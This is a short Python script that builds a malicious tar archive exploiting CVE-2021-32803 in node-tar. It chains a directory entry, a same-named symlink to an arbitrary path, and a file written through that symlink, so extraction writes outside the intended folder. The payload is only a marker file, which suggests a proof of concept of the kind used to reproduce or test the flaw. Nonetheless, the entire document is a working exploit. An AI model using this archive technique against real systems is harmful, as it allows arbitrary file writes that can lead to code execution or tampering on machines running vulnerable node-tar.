#!/usr/bin/env python3
"""
Create a malicious tar archive that exploits CVE-2021-32803 in node-tar.

Usage: python3 create_tar.py <output_tar_path> <symlink_target_dir>

The archive contains three entries in order:
  1. subdir/       — directory  (gets cached by node-tar)
  2. subdir        — symlink    (replaces the directory on disk; cache is stale)
  3. subdir/pwned.txt — file    (written through the stale-cached "directory",
                                 actually lands in the symlink target)
"""

import sys
import tarfile
import io

def main():
    tar_path = sys.argv[1]
    link_target = sys.argv[2]

    with tarfile.open(tar_path, "w") as tf:
        # 1. Directory entry
        d = tarfile.TarInfo(name="subdir")
        d.type = tarfile.DIRTYPE
        d.mode = 0o755
        tf.addfile(d)

        # 2. Symlink with the same name, pointing outside the extraction dir
        s = tarfile.TarInfo(name="subdir")
        s.type = tarfile.SYMTYPE
        s.linkname = link_target
        tf.addfile(s)

        # 3. File that should land inside the symlink target
        data = b"EXPLOIT_PROOF"
        f = tarfile.TarInfo(name="subdir/pwned.txt")
        f.size = len(data)
        f.mode = 0o644
        tf.addfile(f, io.BytesIO(data))

if __name__ == "__main__":
    main()
